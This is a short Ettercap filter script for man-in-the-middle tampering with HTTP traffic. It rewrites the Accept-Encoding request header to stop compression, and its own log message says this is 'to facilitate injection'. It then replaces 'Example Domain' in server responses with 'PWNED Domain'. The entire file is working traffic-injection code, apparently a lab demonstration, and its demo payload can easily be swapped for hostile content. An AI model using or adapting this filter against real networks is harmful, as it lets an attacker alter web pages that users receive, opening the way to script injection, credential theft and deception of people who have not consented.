if (ip.proto == TCP && tcp.dst == 80) {
   if (search(DATA.data, "Accept-Encoding")) {
      replace("Accept-Encoding", "Accept-Nothing ");
      msg("Disabled HTTP compression to facilitate injection\n");
   }
}
if (ip.proto == TCP && tcp.src == 80) {
   if (search(DATA.data, "Example Domain")) {
      replace("Example Domain", "PWNED Domain   ");
      msg("Successfully injected content into HTTP response\n");
   }
}
